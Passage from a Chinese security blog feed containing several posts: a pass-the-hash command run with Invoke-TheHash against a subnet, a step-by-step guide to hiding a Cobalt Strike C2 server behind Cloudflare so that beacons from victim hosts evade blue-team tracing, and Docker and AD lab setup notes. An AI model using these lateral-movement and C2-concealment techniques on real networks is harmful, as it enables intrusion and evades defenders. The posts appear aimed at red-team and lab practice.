class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066895951-c8da0db7-1b91-4f33-89e3-4fc7b086dfb4.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=51&id=ub9b3abc8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=77&originWidth=1595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22139&status=done&style=none&taskId=uee3ff694-cdd1-45f5-9577-b21e4592706&title=&width=1063.3333333333333" alt="image.png"></h4><h3 id="网段-2"><a href="#网段-2" class="headerlink" title="网段"></a>网段</h3><h4 id="Ps1-hash传递-1"><a href="#Ps1-hash传递-1" class="headerlink" title="Ps1_hash传递"></a>Ps1_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066316709-eecd7305-9629-4222-9d7d-6625f0e4e047.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=69&id=ue4619d3a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=1600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30387&status=done&style=none&taskId=u77ff4673-564f-4458-bc6e-df773ce0a5c&title=&width=1066.6666666666667" alt="image.png"></h2><h3 id="超级弱口令检查工具-SMB-RDP"><a href="#超级弱口令检查工具-SMB-RDP" class="headerlink" title="超级弱口令检查工具 SMB&#x2F;RDP"></a>超级弱口令检查工具 SMB&#x2F;RDP</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654067044438-186b5985-b19a-40a2-bc65-c295c145f39c.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=701&id=u7a89aa82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1052&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206076&status=done&style=none&taskId=ubf7b89bb-8301-4e59-a6ea-77faab429f9&title=&width=874.6666666666666" alt="image.png"></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br><a href="https://github.com/shadow1ng/fscan" target="_blank" rel="noopener">https://github.com/shadow1ng/fscan</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a><br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> hash传递 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cobaltstrike域前置</title>
      <link href="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/"/>
      <url>/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>CS的流量特征是很明显的，如果蓝队成员在流量中发现了相关特征那么基本也就宣告了个权限的丢失，而且还有可能被疏远反制。正因为CS的流量的特征太明显，所以需要对CS进行一些修改和对VPS的地址进行保护，尽可以降低被发现后造成权限丢失和被溯源反制的事情发生概率，加大蓝队的疏远难度。<br>主要思路</p><a id="more"></a><h2 id="主要思路与配置"><a href="#主要思路与配置" class="headerlink" title="主要思路与配置"></a>主要思路与配置</h2><p>● 免费tk域名<br>● cloudflare<br>● 云服务器<br>通过 匿名域名-&gt;CDN-&gt;VPS，在这个过程中来隐藏我们的真实IP，达到套了CDN，找不到服务器真实ip的情况。</p><h3 id="达到的效果"><a href="#达到的效果" class="headerlink" title="达到的效果"></a>达到的效果</h3><p>● 受害者主机运行木马—–&gt;CDN—-&gt;CS服务器收到上线<br>● CS服务器执行命令—–&gt;CDN—–&gt;受害者主机执行命令</p><h2 id="申请域名"><a href="#申请域名" class="headerlink" title="申请域名"></a>申请域名</h2><p>&nbsp;&nbsp;我们选用<a href="https://www.freenom.com/zh/index.html?lang=zh" target="_blank" rel="noopener">freenom.com</a>去申请一个免费的域名。</p><p><img src="/1.png"></p><p>&nbsp;&nbsp;这边建议直接输出域名包括后缀，否则可能显示不可用，例如：xxx.tk</p><p>成功注册后，先去弄一个cloudflare账号，将注册的域名添加进去。</p><p><img src="/2.png"></p><h2 id="关联Cloudflare"><a href="#关联Cloudflare" class="headerlink" title="关联Cloudflare"></a>关联Cloudflare</h2><p>&nbsp;&nbsp;将freenom中申请的域名，在管理界面中DNS解析改cloudflare提供的DNS</p><p><img src="/3.png"></p><p>&nbsp;&nbsp;在DNS的子模块中找到属于你的DNS服务器，填入freenom管理台中Management tools-&gt;Nameservers</p><p><img src="/4.png"></p><p>&nbsp;&nbsp;选择第二个，填入你的Cloudflare DNS</p><p><img src="/5.png"></p><h2 id="Cloudflare配置"><a href="#Cloudflare配置" class="headerlink" title="Cloudflare配置"></a>Cloudflare配置</h2><h3 id="缓存设置"><a href="#缓存设置" class="headerlink" title="缓存设置"></a>缓存设置</h3><p>接下来在Cloudflare中进行设置，首先在概述-&gt;快速设置</p><p><img src="/6.png"></p><p>这边都要关闭，设置完之后看一下Summary，是不是都关闭了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Automatic HTTPS Rewrites: <span class="keyword">OFF</span></span><br><span class="line"><span class="keyword">Always</span> use HTTPS: <span class="keyword">OFF</span></span><br><span class="line">Auto Minify: <span class="keyword">NONE</span></span><br><span class="line">Brotli: <span class="keyword">OFF</span></span><br></pre></td></tr></table></figure><p><img src="/7.png"></p><p>&nbsp;&nbsp;找到Caching -&gt; Configuration在其中开启Always Online以及Development Mode,经过实验，配置好之后Development Mode模式不用开启也可以，需要在规则上面配置</p><p><img src="/8.png"></p><h3 id="规则配置"><a href="#规则配置" class="headerlink" title="规则配置"></a>规则配置</h3><p>在Rules-&gt;Page Rules 页面设置，什么路径走代理，什么路径不走代理。个人测试配置完后可以不开Development Mode</p><p><img src="/Rules.png"></p><h2 id="CS配置"><a href="#CS配置" class="headerlink" title="CS配置"></a>CS配置</h2><h3 id="证书配置"><a href="#证书配置" class="headerlink" title="证书配置"></a>证书配置</h3><p>在SSL&#x2F;TLS -&gt;Overview 修改为Full即可</p><p><img src="/9.png"></p><p>再到Origin Server页面下创建证书</p><p><img src="/10.png"><br>保存我们的pem和key文件（命名为xxx.tk.pem、xxx.tk.key），在服务器cs同文件夹下放置，并且如下执行命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">openssl</span> <span class="selector-tag">pkcs12</span> <span class="selector-tag">-export</span> <span class="selector-tag">-in</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.pem</span> <span class="selector-tag">-inkey</span> <span class="selector-tag">update</span><span class="selector-class">.xxx</span><span class="selector-class">.tk</span><span class="selector-class">.key</span> <span class="selector-tag">-out</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.p12</span> <span class="selector-tag">-name</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span> <span class="selector-tag">-passout</span> <span class="selector-tag">pass</span><span class="selector-pseudo">:123456</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">keytool</span> <span class="selector-tag">-importkeystore</span> <span class="selector-tag">-deststorepass</span> 123456 <span class="selector-tag">-destkeypass</span> 123456 <span class="selector-tag">-destkeystore</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.store</span> <span class="selector-tag">-srckeystore</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.p12</span> <span class="selector-tag">-srcstoretype</span> <span class="selector-tag">PKCS12</span> <span class="selector-tag">-srcstorepass</span> 123456 <span class="selector-tag">-alias</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span></span><br></pre></td></tr></table></figure><p>最后会生成一个xxx.tk.store文件，上面的xxx.tk就是你的申请的域名。其中文件有个坑，cs的store的默认密码是123456所以我这边都保持一致免得出错。</p><h3 id="profile编写"><a href="#profile编写" class="headerlink" title="profile编写"></a>profile编写</h3><p>在cs同目录下编写文件cs.profile，这边写个最简单的。将里面xxx.tk替换成你的域名即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="builtin-name">set</span> keystore <span class="string">"xxx.tk.store.store"</span>;</span><br><span class="line">    <span class="builtin-name">set</span> password <span class="string">"123456"</span>;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x86 <span class="string">"/api/1"</span>;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x64 <span class="string">"/api/2"</span>;</span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">"Host"</span> <span class="string">"xxx.tk"</span>;&#125;</span><br><span class="line">   <span class="built_in"> server </span>&#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">http-<span class="builtin-name">get</span> &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">"/api/3"</span>;</span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">"Host"</span> <span class="string">"xxx.tk"</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            header <span class="string">"Cookie"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="built_in"> server </span>&#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">"/api/4"</span>;</span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">"Host"</span> <span class="string">"xxx.tk"</span>;</span><br><span class="line">        id &#123;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in"> server </span>&#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写好后利用CS自带的c2lint来测试可用性，同目录下执行命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint <span class="keyword">cs</span>.<span class="keyword">profile</span></span><br></pre></td></tr></table></figure><p><img src="/11.png"></p><h3 id="修改证书"><a href="#修改证书" class="headerlink" title="修改证书"></a>修改证书</h3><p>&nbsp;&nbsp;修改自带的cobaltStrike.store证书，先删除cobaltStrike.store文件，后续编写teamserver文件,将原本在这个位置的那句话删掉修改为如下内容</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass <span class="number">123456</span> -keypass <span class="number">123456</span> -genkey -keyalg RSA -alias http:<span class="comment">//google.com -dname "CN=US, OU=google.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN"</span></span><br></pre></td></tr></table></figure><p><img src="/12.png"></p><p>&nbsp;&nbsp;修改完后，下次运行teamserver文件时会自动生成新的cobaltStrike.store文件</p><h3 id="cs运行"><a href="#cs运行" class="headerlink" title="cs运行"></a>cs运行</h3><p>&nbsp;&nbsp;配置完规则后，运行CS，加载profile文件</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver <span class="symbol">x</span>.<span class="symbol">x</span>.<span class="symbol">x</span>.<span class="symbol">x</span> ****** cs.profile</span><br></pre></td></tr></table></figure><p><img src="/14.png"></p><p>&nbsp;&nbsp;new一个新的Listener<br><br>&nbsp;&nbsp;这边需要注意Cloudflare只支持监听以下端口：<br></p><ul><li>HTTP端口：80,8080,8880,2052,2082,2086,2095</li><li>HTTPs端口：443,2053,2083,2087,2096,8443</li><li>注意：如果VPS是国内云主机，且注册的免费域名没有备案，则不能使用80、8080、443、8443端口提供服务，否则会被拦截提示备案才能访问。</li></ul><p><img src="/15.png"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>直接访问显示不存在 404，可以正常上线<br><img src="/16.png"></p><p><img src="/17.png"></p><h3 id="profile方面"><a href="#profile方面" class="headerlink" title="profile方面"></a>profile方面</h3><p>profile方面复杂的可以用github上面的收集了几个好用的Malleable-C2，还有挺多的，可以在github上搜搜</p><p><a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="noopener">Malleable-C2-Profiles</a><br><br><a href="https://github.com/threatexpress/malleable-c2" target="_blank" rel="noopener">malleable-c2</a><br><br><a href="https://github.com/FortyNorthSecurity/C2concealer" target="_blank" rel="noopener">C2concealer</a></p>]]></content>
      
      
      <categories>
          
          <category> 域前置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker搭建</title>
      <link href="/2022/04/17/docker%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/04/17/docker%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p><a name="MRO41"></a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a name="JGWFo"></a></p><h3 id="本地为centos8（已停止维护）"><a href="#本地为centos8（已停止维护）" class="headerlink" title="本地为centos8（已停止维护）"></a>本地为centos8（已停止维护）</h3><p><a name="DpgRB"></a></p><h3 id="1、换华为源（阿里云源也停止维护了）"><a href="#1、换华为源（阿里云源也停止维护了）" class="headerlink" title="1、换华为源（阿里云源也停止维护了）"></a>1、换华为源（阿里云源也停止维护了）</h3><a id="more"></a><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">下载新源</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-<span class="module-access"><span class="module"><span class="identifier">Base</span>.</span></span>repo https:<span class="comment">//repo.huaweicloud.com/repository/conf/CentOS-8-reg.repo</span></span><br><span class="line"></span><br><span class="line">AppStream源，移除可直接删除或者，改为备份文件</span><br><span class="line">mv CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">AppStream</span>.</span></span>repo  CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">AppStream</span>.</span></span>repo.bak</span><br><span class="line"></span><br><span class="line">BaseOS源同样，移除可直接删除或者，改为备份文件</span><br><span class="line">mv CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">BaseOS</span>.</span></span>repo CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">BaseOS</span>.</span></span>repo.bak</span><br><span class="line"></span><br><span class="line">清除原有源缓存并生成新源缓存</span><br><span class="line">yum clean all<span class="operator"> &amp;&amp; </span>yum makecache</span><br></pre></td></tr></table></figure><p><a name="gM6Zw"></a></p><h3 id="2、yum包更新（可以忽略）"><a href="#2、yum包更新（可以忽略）" class="headerlink" title="2、yum包更新（可以忽略）"></a>2、yum包更新（可以忽略）</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">yum update</span></span><br></pre></td></tr></table></figure><p><a name="Ej3n5"></a></p><h3 id="3、安装需要的软件包，-yum-util-提供yum-config-manager功能，另外两个是devicemapper驱动依赖的"><a href="#3、安装需要的软件包，-yum-util-提供yum-config-manager功能，另外两个是devicemapper驱动依赖的" class="headerlink" title="3、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的"></a>3、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</h3><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -<span class="symbol">y</span> yum-utils device-mapper-<span class="symbol">persistent</span>-data lvm2</span><br></pre></td></tr></table></figure><p><a name="zNViO"></a></p><h3 id="4、配置阿里云的docker仓库"><a href="#4、配置阿里云的docker仓库" class="headerlink" title="4、配置阿里云的docker仓库"></a>4、配置阿里云的docker仓库</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --<span class="built_in">add</span>-repo http<span class="variable">s:</span>//mirrors.aliyun.<span class="keyword">com</span>/docker-<span class="keyword">ce</span>/linux/centos/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">dnf install http<span class="variable">s:</span>//mirrors.aliyun.<span class="keyword">com</span>/docker-<span class="keyword">ce</span>/linux/centos/<span class="number">7</span>/x86_64/stable/Packages/containerd.io-<span class="number">1.2</span>.<span class="number">13</span>-<span class="number">3.1</span>.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">dnf install docker-<span class="keyword">ce</span></span><br></pre></td></tr></table></figure><p><a name="INkDZ"></a></p><h3 id="5、下载docker-ce的repo"><a href="#5、下载docker-ce的repo" class="headerlink" title="5、下载docker-ce的repo"></a>5、下载docker-ce的repo</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http<span class="variable">s:</span>//download.docker.<span class="keyword">com</span>/linux/centos/docker-<span class="keyword">ce</span>.repo -<span class="keyword">o</span> /etc/yum.repos.d/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">dnf -<span class="keyword">y</span>  install docker-<span class="keyword">ce</span>  docker-<span class="keyword">ce</span>-cli --nobest</span><br></pre></td></tr></table></figure><p>6、启动docker</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> docker</span><br></pre></td></tr></table></figure><p>7、安装docker-comper</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> docker-compose</span><br></pre></td></tr></table></figure><p><a name="ELKcB"></a></p><h2 id="操作基本镜像"><a href="#操作基本镜像" class="headerlink" title="操作基本镜像"></a>操作基本镜像</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">拉取，例如ubuntu</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">pull ubuntu</span></span><br><span class="line"></span><br><span class="line"><span class="attr">查看当前存在的镜像</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">images</span></span><br><span class="line"></span><br><span class="line"><span class="attr">运行镜像</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">run &lt;IMAGE ID&gt;    镜像ID不一定要全部，部分也行</span></span><br><span class="line"></span><br><span class="line"><span class="attr">docker</span> <span class="string">ps -a 查看运行状态</span></span><br></pre></td></tr></table></figure><p><a name="rPju1"></a></p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker-compose安装</span><br><span class="line">sudo curl -L <span class="string">"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)"</span> -o <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>docker-compose</span><br><span class="line"></span><br><span class="line">二进制文件应用可执行权限</span><br><span class="line">sudo chmod +x <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>docker-compose</span><br></pre></td></tr></table></figure><p>将容器弄成靶机后，需要将容器暂停，再打包成镜像<br><a name="Xolyh"></a></p><h3 id="docker中创建储存库"><a href="#docker中创建储存库" class="headerlink" title="docker中创建储存库"></a>docker中创建储存库</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1649240159389-79318a66-3b79-4004-b9f8-51436a129e54.png#clientId=ua091ed00-979a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=650&id=JaGIw&margin=%5Bobject%20Object%5D&name=image.png&originHeight=975&originWidth=2363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131388&status=done&style=none&taskId=uafc26856-b1af-4de3-a4b0-38d8886079d&title=&width=1575.3333333333333" alt="image.png"><br><a name="GbR9r"></a></p><h2 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">暂停容器</span><br><span class="line">docker <span class="keyword">stop</span> &lt;<span class="keyword">CONTAINER</span> <span class="keyword">ID</span>&gt;</span><br><span class="line"></span><br><span class="line">打包成镜像</span><br><span class="line">docker <span class="keyword">commit</span> -a <span class="string">"xx"</span> -m <span class="string">"xxxx"</span> &lt;<span class="keyword">CONTAINER</span> <span class="keyword">ID</span>&gt; &lt;docker账户名称/存储库:latest&gt;</span><br><span class="line">-a 提交的镜像作者</span><br><span class="line">-m 提交时的说明文字</span><br><span class="line">docker <span class="keyword">commit</span> -a <span class="string">"z1du"</span> -m <span class="string">"test"</span> <span class="number">4</span>cb57b89fc93  docker账户名称/ubuntutest:latest</span><br></pre></td></tr></table></figure><p><a name="aDEp8"></a></p><h3 id="docker-登录"><a href="#docker-登录" class="headerlink" title="docker 登录"></a>docker 登录</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在机器上登录docker账号</span><br><span class="line">docker <span class="keyword">login</span></span><br></pre></td></tr></table></figure><p><a name="b9HlG"></a></p><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">push </span>docker账户名称/ubuntutest</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1649240898090-7ac77c37-7c51-4297-a543-2216e4f48d8e.png#clientId=ua091ed00-979a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=847&id=ue5abb09a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1271&originWidth=1958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=180303&status=done&style=none&taskId=u5113da0e-d9a6-4fc8-9a87-c30e7169dec&title=&width=1305.3333333333333" alt="image.png"><br><a name="syD5b"></a></p><h2 id="docker-compose-yml文件编写"><a href="#docker-compose-yml文件编写" class="headerlink" title="docker-compose.yml文件编写"></a>docker-compose.yml文件编写</h2><p>上传完后可以编写一个简单的docker-compose.yml文件，方便别人拉取你的镜像来进行漏洞复现。详细的可以看官方文档(<a href="https://docs.docker.com/compose/" target="_blank" rel="noopener">https://docs.docker.com/compose/</a>)</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="symbol">services:</span></span><br><span class="line"><span class="symbol"> weblogic:</span></span><br><span class="line"><span class="symbol">   image:</span> z1du/weblogic12214jdk8u181</span><br><span class="line"><span class="symbol">   ports:</span></span><br><span class="line">    - <span class="string">"7001:7001"</span></span><br></pre></td></tr></table></figure><p>通过docker-compose构建靶机环境</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span>-compose <span class="keyword">build </span></span><br><span class="line"><span class="symbol">docker</span>-compose up -d</span><br></pre></td></tr></table></figure><p><a name="F93L9"></a></p><h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><p>如果遇到上传不上去，一直失败，建议用代理，或者换源。可能是太大了上传时间太久，导致的问题</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建域环境(小)</title>
      <link href="/2022/03/15/%E6%90%AD%E5%BB%BA%E5%9F%9F%E7%8E%AF%E5%A2%83/"/>
      <url>/2022/03/15/%E6%90%AD%E5%BB%BA%E5%9F%9F%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>搭建域环境机器选择：<br>域控：Windows_server_2008_r2<br>域服务器：Windows_server_2012<br>PC机器：win7、winXP<br>推荐几个Windows Server 2008 R2镜像下载地址：</p><ul><li><a href="https://www.cnblogs.com/waw/p/4588629.html" target="_blank" rel="noopener">https://www.cnblogs.com/waw/p/4588629.html</a></li><li><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></li><li><a href="https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA" target="_blank" rel="noopener">https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA</a> 提取码：izny</li></ul><a id="more"></a><h2 id="配置AD域服务"><a href="#配置AD域服务" class="headerlink" title="配置AD域服务"></a>配置AD域服务</h2><p>下载好镜像后,添加至VM中开始安装。我这边给域控分配的是2G内存，30G储存。</p><p>选择Windows Server 2008 R2 Standard(完全安装)</p><p><img src="/1.jpg"></p><p>选择自定义(高级)</p><p><img src="/2.jpg"></p><p>点击下一步</p><p><img src="/3.jpg"></p><p>等待安装</p><p><img src="/4.jpg"></p><p>设置完账号密码后登陆，选择添加角色，选择安装Active Directory 域服务即可</p><p><img src="/AD%E5%9F%9F%E6%9C%8D%E5%8A%A1.jpg"></p><p>添加域名，尽量不要和经常使用的重合&#x3D; &#x3D;</p><p><img src="/5.jpg"></p><p>下一步</p><p><img src="/6.jpg"></p><p>DNS服务器安装</p><p><img src="/7.jpg"></p><p>是</p><p><img src="/8.jpg"></p><p>配置IP，这台机器的IP是192.168.71.137，192.168.71.2的是VM的网关，配置完后域控就配置完了</p><p><img src="/9.jpg"></p><h2 id="配置win7-pc机器"><a href="#配置win7-pc机器" class="headerlink" title="配置win7 pc机器"></a>配置win7 pc机器</h2><p>配置PC win7的网络，备选DNS记得选上VM的，免得域控没开，机器不能出网</p><p><img src="/10.jpg"></p><p>在域控中查找Active Directory 用户和计算机-&gt;users-&gt;新建-&gt;用户</p><p><img src="/11.jpg"></p><p>将域用户信息填入。</p><p><img 